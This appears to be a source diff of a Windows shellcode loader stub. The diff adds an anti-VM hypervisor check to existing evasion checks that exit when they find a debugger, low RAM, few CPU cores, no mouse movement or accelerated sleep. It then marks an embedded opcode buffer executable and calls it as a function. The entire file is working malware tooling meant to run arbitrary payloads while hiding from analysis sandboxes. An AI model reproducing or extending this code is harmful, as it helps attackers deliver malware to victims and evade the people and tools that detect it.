@@ -1,16 +1,16 @@
 #include <Windows.h>
-#include <stdio.h>
 #include "Anti.h"
 
 // Data that will be replaced by RibeyeSpecial, prepare 20bytes for now but will grow
-const char rawData[2097152] = { 'C', 'O', 'C', 'O', 'N', 'U', 'T', 'Z' };
+const char rawData[2097252] = { 'C', 'O', 'C', 'O', 'N', 'U', 'T', 'Z' };
 
 // Struct that will determine the configuration to run this
 struct Coconut
 {
-	int AES_Key = 0;
-	bool sleep = false;
+	int AES_Key = 20;
 	int sleepTime = 5000;
+	bool sleep = false;
+	bool antivm = false;
 	bool prime = false;
 	bool mouse = false;
 	bool acceleratedsleep = false;
@@ -18,58 +18,66 @@ struct Coconut
 	bool ram = false;
 	bool cpu_core = true;
 	int szData = 0;
-	const char * opcodes = 0;
+	char opcodes[2097152] = { 0 };
 };
 
 
 int main()
 {
-	Coconut settings = *(Coconut*)rawData;
+	Coconut * settings = (Coconut*)rawData;
 
+	if (settings->antivm)
+	{
+		if (cpuid_hypervisor_vendor())
+		{
+			return 1;
+		}
+	}
 
-	printf("%d %d %d %d %d %d %d %d | %d %d %d %d %d\n", settings.sleep, settings.sleepTime, settings.prime, settings.mouse, settings.acceleratedsleep, settings.debugger, settings.ram, settings.cpu_core, (BYTE)settings.opcodes, (BYTE)settings.opcodes + 1, (BYTE)settings.opcodes + 2, (BYTE)settings.opcodes + 3 );
-
-	if (settings.prime) 
+	if (settings->prime) 
 	{ 
 		prime();
 	}
-	if (settings.sleep)
+	if (settings->sleep)
 	{
-		ntSleep(settings.sleepTime);
+		ntSleep(settings->sleepTime);
 	}
-	if (settings.mouse)
+	if (settings->mouse)
 	{
 		if (chk_mouse())
 			return 1;
 	}
-	if (settings.acceleratedsleep)
+	if (settings->acceleratedsleep)
 	{
 		if (chk_acceleratedsleep())
 			return 1;
 	}
-	if (settings.debugger)
+	if (settings->debugger)
 	{
 		if (chk_dbg())
 			return 1;
 	}
-	if (settings.ram) 
+	if (settings->ram) 
 	{
 		if (chk_ram())
 			return 1;
 	}
-	if (settings.cpu_core)
+	if (settings->cpu_core)
 	{
 		if (chk_cores())
 			return 1;
 	}
 
 	DWORD old;
-	if (VirtualProtect((LPVOID)settings.opcodes, settings.szData, PAGE_EXECUTE, &old)) {
+	if (!ChangePageProtection((HANDLE)-1, (LPVOID)settings->opcodes, (PULONG)settings->szData, PAGE_EXECUTE, &old)) {
 
-		int(*foo)() = (int(*)())(LPVOID)settings.opcodes;
-		DWORD foo_value = foo();
+		int(*apt)() = (int(*)())(LPVOID)settings->opcodes;
+		DWORD foo_value = apt();
 
 	}
+	else {
+	}
+
 
 	return 0;
 }
